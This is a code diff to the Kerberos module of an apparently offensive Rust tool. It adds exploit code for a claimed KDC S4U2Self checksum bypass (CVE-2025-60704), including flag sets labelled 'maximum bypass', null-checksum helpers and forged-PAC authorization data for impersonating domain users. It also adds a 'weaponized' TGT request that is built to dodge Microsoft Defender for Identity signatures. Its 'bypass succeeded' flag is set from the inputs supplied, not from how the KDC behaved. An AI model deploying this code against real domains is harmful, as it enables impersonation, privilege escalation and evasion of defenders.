@@ -7,16 +7,17 @@ use crate::error::{OverthroneError, Result};
 use crate::proto::ntlm;
 use chrono::Utc;
 use kerberos_asn1::{
-    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, Checksum, EncAsRepPart,
+    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, EncAsRepPart,
     EncTgsRepPart, EncryptedData, KdcReqBody, KerbPaPacRequest, KerberosFlags, KerberosTime,
-    KrbError, PaData, PaEncTsEnc, PaForUser, PrincipalName, TgsRep, TgsReq, Ticket,
+    KrbError, PaData, PaEncTsEnc, PaForUser, PaPacOptions, PrincipalName, TgsRep, TgsReq, Ticket,
 };
+pub use kerberos_asn1::Checksum;
 use kerberos_crypto::new_kerberos_cipher;
 use md5::Md5;
 use std::net::SocketAddr;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
-use tracing::{debug, info};
+use tracing::{debug, info, warn};
 
 // ═══════════════════════════════════════════════════════════
 //  Constants
@@ -286,6 +287,39 @@ fn build_pa_pac_request(include_pac: bool) -> PaData {
     }
 }
 
+/// Build PA-PAC-OPTIONS padata for checksum bypass exploitation.
+///
+/// CVE-2025-60704: When PA-PAC-OPTIONS is present with certain flag
+/// combinations, the KDC may skip or reduce S4U2Self checksum validation.
+///
+/// The `pac_flags` parameter is a u32 bitmask of PA-PAC-OPTIONS flags.
+/// Common flag values:
+/// - `0x00000000`: No options (baseline)
+/// - `0x80000000`: Resource-based constrained delegation flag
+/// - `0x40000000`: Claims flag
+/// - `0xC0000000`: Both flags (maximum bypass)
+pub fn build_pa_pac_options(pac_flags: u32) -> PaData {
+    let options = PaPacOptions {
+        kerberos_flags: KerberosFlags::from(pac_flags),
+    };
+    PaData {
+        padata_type: PA_PAC_OPTIONS,
+        padata_value: options.build(),
+    }
+}
+
+/// Build a raw S4U2Self checksum (without HMAC) for the null-checksum technique.
+/// Same input data format as `build_s4u2self_checksum` but returns raw bytes
+/// instead of a `Checksum` struct.
+pub fn build_s4u2self_checksum_raw(username: &str, realm: &str) -> Vec<u8> {
+    let mut data: Vec<u8> = Vec::new();
+    data.extend_from_slice(&(NT_PRINCIPAL as u32).to_le_bytes());
+    data.extend_from_slice(username.as_bytes());
+    data.extend_from_slice(realm.as_bytes());
+    data.extend_from_slice(b"Kerberos");
+    data
+}
+
 /// Build encrypted timestamp for pre-authentication
 fn build_pa_enc_timestamp(key: &[u8], etype: i32) -> Result<PaData> {
     let now = Utc::now();
@@ -358,6 +392,71 @@ pub(crate) fn build_ap_req(ticket: &Ticket, encrypted_auth: EncryptedData) -> Ap
         ticket: ticket.clone(),
         authenticator: encrypted_auth,
     }
+}
+
+/// Build raw DER-encoded authorization-data containing a forged PAC.
+///
+/// Structure:
+///   SEQUENCE {
+///     AuthorizationDataEntry {
+///       [0] INTEGER 1        (AD-IF-RELEVANT)
+///       [1] OCTET STRING {
+///         SEQUENCE {
+///           [0] INTEGER 128   (AD-WIN2K-PAC)
+///           [1] OCTET STRING  (pac_bytes)
+///         }
+///       }
+///     }
+///   }
+pub fn build_pac_authdata_raw(pac_bytes: &[u8]) -> Vec<u8> {
+    let ad_type_pac = asn1_context_tag(0, &asn1_integer(128));
+    let ad_data_pac = asn1_context_tag(1, &asn1_octet_string(pac_bytes));
+    let inner_pac_entry = asn1_sequence_raw(&[&ad_type_pac, &ad_data_pac]);
+
+    let ad_type_if_relevant = asn1_context_tag(0, &asn1_integer(1));
+    let ad_data_wrapper = asn1_context_tag(1, &asn1_octet_string(&inner_pac_entry));
+    let authdata_entry = asn1_sequence_raw(&[&ad_type_if_relevant, &ad_data_wrapper]);
+
+    asn1_sequence(&[&authdata_entry])
+}
+
+/// Build an encrypted authenticator that includes authorization-data.
+///
+/// Builds the authenticator manually using raw ASN.1 helpers (like
+/// `build_encrypted_authenticator` but with authorization-data), then
+/// encrypts with key_usage=7.
+pub fn build_encrypted_authenticator_with_authdata(
+    realm: &str,
+    cname: &str,
+    session_key: &[u8],
+    etype: i32,
+    auth_data_raw: &[u8],
+) -> Result<EncryptedData> {
+    let now = Utc::now();
+
+    let tag0 = asn1_context_tag(0, &asn1_integer(NT_PRINCIPAL as i64));
+    let tag1 = asn1_context_tag(1, &asn1_sequence_of_general_strings(&[cname]));
+    let cname_seq = asn1_sequence_raw(&[&tag0, &tag1]);
+
+    let ctag0 = asn1_context_tag(0, &asn1_integer(5));
+    let ctag1 = asn1_context_tag(1, &asn1_general_string(realm));
+    let ctag2 = asn1_context_tag(2, &cname_seq);
+    let ctag4 = asn1_context_tag(4, &asn1_integer(now.timestamp_subsec_micros() as i64));
+    let ctag5 = asn1_context_tag(5, &asn1_generalized_time(&format_kerberos_time(&now)));
+    let ctag7 = asn1_context_tag(7, &asn1_integer(rand::random::<u32>() as i64));
+    let ctag10 = asn1_context_tag(10, auth_data_raw);
+    let authenticator_raw = asn1_sequence_raw(&[&ctag0, &ctag1, &ctag2, &ctag4, &ctag5, &ctag7, &ctag10]);
+
+    let cipher = new_kerberos_cipher(etype)
+        .map_err(|e| OverthroneError::Kerberos(format!("Cipher error: {e}")))?;
+
+    let encrypted = cipher.encrypt(session_key, 7, &authenticator_raw);
+
+    Ok(EncryptedData {
+        etype,
+        kvno: None,
+        cipher: encrypted,
+    })
 }
 
 /// Build a serialized AP-REQ from raw ticket bytes + session key.
@@ -721,6 +820,180 @@ pub async fn request_tgt(
     ))
 }
 
+/// Options for OPSEC-compliant TGT requests.
+#[derive(Debug, Clone, Default)]
+pub struct RequestTgtOptions {
+    /// Use AES256 (etype 18) instead of RC4 (etype 23).
+    /// Avoids MDI signatures from RC4 ticket requests.
+    pub aes_only: bool,
+    /// Enable FAST armoring (RFC 6806) for the TGT request.
+    /// Required for WS2025 domains with FAST enforcement.
+    pub use_fast_armor: bool,
+    /// TGT to use as armor ticket (required if `use_fast_armor` is true).
+    pub armor_tgt: Option<TicketGrantingData>,
+}
+
+/// Request a TGT with OPSEC options (AES-only mode).
+///
+/// This is the weaponized version of `request_tgt` that defaults to
+/// AES256 (etype 18) to avoid MDI signatures from RC4 ticket requests.
+///
+/// When `aes_only` is true:
+/// - Requests etype 18 as the preferred encryption type
+/// - Falls back to etype 17 (AES128) then 23 (RC4) if AES256 is unsupported
+/// - Uses the password → AES key derivation instead of NT hash → RC4
+///
+/// When `aes_only` is false, behaves identically to `request_tgt`.
+pub async fn request_tgt_opsec(
+    dc_ip: &str,
+    domain: &str,
+    username: &str,
+    secret: &str,
+    use_hash: bool,
+    options: &RequestTgtOptions,
+) -> Result<TicketGrantingData> {
+    let realm = normalize_realm(domain);
+    let clean_username = normalize_username(username);
+
+    if options.use_fast_armor {
+        warn!("FAST armoring requires pre-existing TGT — use armor_tgt field");
+    }
+
+    let supported_etypes: &[i32] = if options.aes_only {
+        &[ETYPE_AES256_CTS, ETYPE_AES128_CTS, ETYPE_RC4_HMAC]
+    } else {
+        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS]
+    };
+
+    info!(
+        "Requesting TGT for {clean_username}@{realm} (etypes={:?})",
+        supported_etypes
+    );
+
+    // For AES-only: derive AES key from password instead of NT hash
+    // For RC4 fallback: use NT hash as before
+    let (key, primary_etype) = if use_hash {
+        (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
+    } else if options.aes_only {
+        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
+        let aes_key = crate::crypto::derive_key_aes256(secret, &salt);
+        (aes_key.to_vec(), ETYPE_AES256_CTS)
+    } else {
+        (ntlm::nt_hash(secret), ETYPE_RC4_HMAC)
+    };
+
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
+
+    for hop in 0..=2 {
+        let pa_timestamp = build_pa_enc_timestamp(&key, primary_etype)?;
+        let pa_pac = build_pa_pac_request(true);
+        let req_body = build_as_req_body(clean_username, &current_realm, supported_etypes);
+
+        let as_req = AsReq {
+            pvno: 5,
+            msg_type: 10,
+            padata: Some(vec![pa_timestamp, pa_pac]),
+            req_body,
+        };
+
+        let response_bytes = kdc_exchange(&current_dc, &as_req.build()).await?;
+
+        // Try decrypting with the primary key first, then fallback etypes
+        let decryption_etypes: &[i32] = if options.aes_only {
+            &[ETYPE_AES256_CTS, ETYPE_AES128_CTS, ETYPE_RC4_HMAC]
+        } else {
+            &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS]
+        };
+
+        match AsRep::parse(&response_bytes) {
+            Ok((_, as_rep)) => {
+                let mut decrypted: Option<Vec<u8>> = None;
+                let mut used_etype = primary_etype;
+
+                for &try_etype in decryption_etypes {
+                    let try_key = if try_etype == ETYPE_RC4_HMAC {
+                        ntlm::nt_hash(secret)
+                    } else if try_etype == ETYPE_AES256_CTS {
+                        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
+                        crate::crypto::derive_key_aes256(secret, &salt).to_vec()
+                    } else if try_etype == ETYPE_AES128_CTS {
+                        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
+                        crate::crypto::derive_key_aes128(secret, &salt).to_vec()
+                    } else {
+                        continue;
+                    };
+
+                    match new_kerberos_cipher(try_etype) {
+                        Ok(cipher) => {
+                            match cipher.decrypt(&try_key, 3, &as_rep.enc_part.cipher) {
+                                Ok(d) => {
+                                    decrypted = Some(d);
+                                    used_etype = try_etype;
+                                    break;
+                                }
+                                Err(_) => continue,
+                            }
+                        }
+                        Err(_) => continue,
+                    }
+                }
+
+                let decrypted = decrypted.ok_or_else(|| {
+                    OverthroneError::Kerberos(
+                        "AS-REP decrypt failed with all supported etypes".into(),
+                    )
+                })?;
+
+                let (_, enc_part) = EncAsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}")))?;
+
+                info!(
+                    "TGT obtained for {username}@{current_realm} (response etype: {})",
+                    enc_part.key.keytype
+                );
+
+                return Ok(TicketGrantingData {
+                    ticket: as_rep.ticket,
+                    session_key: enc_part.key.keyvalue.clone(),
+                    session_key_etype: enc_part.key.keytype,
+                    client_principal: clean_username.to_string(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_part.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "KDC_ERR_WRONG_REALM: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("KDC referred us to realm '{suggested}' (hop {hop})");
+
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "KDC_ERR_WRONG_REALM: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "request_tgt_opsec: referral loop exhausted".to_string(),
+    ))
+}
+
 // ═══════════════════════════════════════════════════════════
 //  Kerberoasting (TGS-REQ for target SPN)
 // ═══════════════════════════════════════════════════════════
@@ -1064,7 +1337,157 @@ pub async fn s4u2self(
     ))
 }
 
-// ═══════════════════════════════════════════════════════════
+/// S4U2Self with PA-PAC-OPTIONS and optional checksum bypass for CVE-2025-60704.
+///
+/// This is a modified s4u2self that:
+/// 1. Includes PA-PAC-OPTIONS in the TGS-REQ padata (triggers bypass on vulnerable KDC)
+/// 2. Uses a caller-provided checksum in PA-FOR-USER (null, mismatched, or replayed)
+/// 3. Reports back whether the KDC accepted the modified request
+///
+/// Returns `(TicketGrantingData, bool)` where the bool indicates whether the
+/// checksum bypass technique succeeded (KDC accepted the modified checksum).
+pub async fn s4u2self_with_checksum_bypass(
+    dc_ip: &str,
+    tgt: &TicketGrantingData,
+    impersonate_user: &str,
+    pac_flags: Option<u32>,
+    custom_checksum: Option<Checksum>,
+) -> Result<(TicketGrantingData, bool)> {
+    let realm = &tgt.client_realm;
+    let clean_impersonate_user = normalize_username(impersonate_user);
+    info!("S4U2Self-bypass: impersonating {clean_impersonate_user}@{realm}");
+
+    let had_custom_checksum = custom_checksum.is_some();
+    let cksum = match custom_checksum {
+        Some(cs) => cs,
+        None => build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key)?,
+    };
+
+    let pa_for_user_data = PaForUser {
+        username: PrincipalName {
+            name_type: NT_PRINCIPAL,
+            name_string: vec![clean_impersonate_user.to_string()],
+        },
+        userrealm: realm.to_string(),
+        cksum,
+        auth_package: "Kerberos".to_string(),
+    };
+
+    let encrypted_auth = build_encrypted_authenticator(
+        realm,
+        &tgt.client_principal,
+        &tgt.session_key,
+        tgt.session_key_etype,
+    )?;
+    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);
+
+    let pa_tgs = PaData {
+        padata_type: PA_TGS_REQ,
+        padata_value: ap_req.build(),
+    };
+    let pa_for_user = PaData {
+        padata_type: PA_FOR_USER,
+        padata_value: pa_for_user_data.build(),
+    };
+
+    // Conditionally add PA-PAC-OPTIONS
+    let pa_pac_options = pac_flags.map(build_pa_pac_options);
+
+    let sname = PrincipalName {
+        name_type: NT_PRINCIPAL,
+        name_string: vec![tgt.client_principal.clone()],
+    };
+
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
+    let mut bypass_succeeded = false;
+
+    for hop in 0..=2 {
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[tgt.session_key_etype],
+            KDC_OPT_FORWARDABLE,
+            None,
+            Some(PrincipalName {
+                name_type: NT_PRINCIPAL,
+                name_string: vec![tgt.client_principal.clone()],
+            }),
+        );
+
+        let mut padata = vec![pa_tgs.clone(), pa_for_user.clone()];
+        if let Some(ref opt) = pa_pac_options {
+            padata.push(opt.clone());
+        }
+
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(padata),
+            req_body,
+        };
+
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
+
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                let cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
+
+                let decrypted = cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;
+
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;
+
+                // If we provided custom checksum and got a ticket back, bypass succeeded
+                bypass_succeeded = had_custom_checksum || pac_flags.is_some();
+
+                info!("S4U2Self-bypass ticket for {impersonate_user} obtained (bypass={bypass_succeeded})");
+                return Ok((
+                    TicketGrantingData {
+                        ticket: tgs_rep.ticket,
+                        session_key: enc_tgs.key.keyvalue,
+                        session_key_etype: enc_tgs.key.keytype,
+                        client_principal: impersonate_user.to_string(),
+                        client_realm: current_realm,
+                        end_time: Some(enc_tgs.endtime),
+                    },
+                    bypass_succeeded,
+                ));
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "S4U2Self-bypass: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("S4U2Self-bypass: KDC referred to realm '{suggested}' (hop {hop})");
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "S4U2Self-bypass: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                // KDC rejected the modified request — bypass technique failed
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "S4U2Self-bypass: referral loop exhausted".to_string(),
+    ))
+}
 //  S4U2Proxy — Forward to target service
 // ═══════════════════════════════════════════════════════════
 
@@ -1184,7 +1607,7 @@ pub async fn s4u2proxy(
 // ═══════════════════════════════════════════════════════════
 
 /// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
-fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Result<Checksum> {
+pub fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Result<Checksum> {
     use hmac::{Hmac, Mac};
 
     let mut data: Vec<u8> = Vec::new();
